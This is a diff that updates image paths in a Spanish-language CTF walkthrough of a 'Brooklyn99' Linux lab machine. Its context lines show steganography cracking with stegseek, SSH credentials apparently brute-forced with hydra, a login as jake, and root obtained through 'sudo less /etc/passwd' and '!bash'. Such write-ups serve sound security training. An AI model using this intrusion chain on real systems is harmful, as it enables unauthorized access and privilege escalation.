@@ -61,7 +61,7 @@ Entramos a:
 http://10.130.149.247
 ```
 
-![url](imagenes/url.png)
+![url](Maquina_de_Linux/Brooklyn99/imagenes/url.png)
 
 
 Hay una imagen de Brooklyn 99
@@ -74,7 +74,7 @@ background-image: url("brooklyn99.jpg");
 <!-- Have you ever heard of steganography? -->
 ```
 
-![codigo](imagenes/codigo.png)
+![codigo](Maquina_de_Linux/Brooklyn99/imagenes/codigo.png)
 
 La clave esta aquí: Imagen + esteganografía
 
@@ -87,7 +87,7 @@ La descargamos:
 wget http://10.130.149.247/brooklyn99.jpg
 ```
 
-![descargar](/Maquina_de_Linux/Brooklyn99/imagenes/descargar.png)
+![descargar](Maquina_de_Linux/Brooklyn99/imagenes/descargar.png)
 
 ## 4. Extraer información oculta
 
@@ -97,7 +97,7 @@ Uso stegseekpara extraer información oculta.
 stegseek --crack brooklyn99.jpg /usr/share/wordlists/rockyou.txt out.txt
 ```
 
-![extraer](/Maquina_de_Linux/Brooklyn99/imagenes/extraer.png)
+![extraer](Maquina_de_Linux/Brooklyn99/imagenes/extraer.png)
 
 
 Miramos que el archivo ls esté extraído.
@@ -111,7 +111,7 @@ Abrimos el archivo que hemos extraído.
 cat out.txt
 ```
 
-![cat](/Maquina_de_Linux/Brooklyn99/imagenes/cat.png)
+![cat](Maquina_de_Linux/Brooklyn99/imagenes/cat.png)
 
 Conseguimos una contraseña que es: fluffydog12@ninenine
 
@@ -128,7 +128,7 @@ El resultado obtenido es:
 - login: jake   
 - password: 987654321
 
-![hydra](/Maquina_de_Linux/Brooklyn99/imagenes/hydra.png)
+![hydra](Maquina_de_Linux/Brooklyn99/imagenes/hydra.png)
 
 
 
@@ -138,7 +138,7 @@ El resultado obtenido es:
 ssh jake@10.130.149.247
 ```
 
-![ssh](/Maquina_de_Linux/Brooklyn99/imagenes/ssh.png)
+![ssh](Maquina_de_Linux/Brooklyn99/imagenes/ssh.png)
 
 Se introduce la contraseña obtenida: 987654321
 Acceso conseguido.
@@ -152,7 +152,7 @@ Se revisan permisos sudo:
 sudo -l
 ```
 
-![sudo](/Maquina_de_Linux/Brooklyn99/imagenes/sudo.png)
+![sudo](Maquina_de_Linux/Brooklyn99/imagenes/sudo.png)
 
 ## 7. Escalada de privilegios
 
@@ -162,7 +162,7 @@ Se ejecuta less con privilegios de root:
 sudo less /etc/passwd
 ```
 
-![sudo](/Maquina_de_Linux/Brooklyn99/imagenes/less.png)
+![sudo](Maquina_de_Linux/Brooklyn99/imagenes/less.png)
 
 Una vez dentro del visor less, se ejecuta el siguiente comando:
 
@@ -170,7 +170,7 @@ Una vez dentro del visor less, se ejecuta el siguiente comando:
 !bash
 ```
 
-![sudo](/Maquina_de_Linux/Brooklyn99/imagenes/bash.png)
+![sudo](Maquina_de_Linux/Brooklyn99/imagenes/bash.png)
 
 Esto permite abrir una shell con privilegios de root.
 
@@ -190,4 +190,4 @@ Resultado esperado:
 root
 ```
 
-![root](/Maquina_de_Linux/Brooklyn99/imagenes/whoami.png)
+![root](Maquina_de_Linux/Brooklyn99/imagenes/whoami.png)
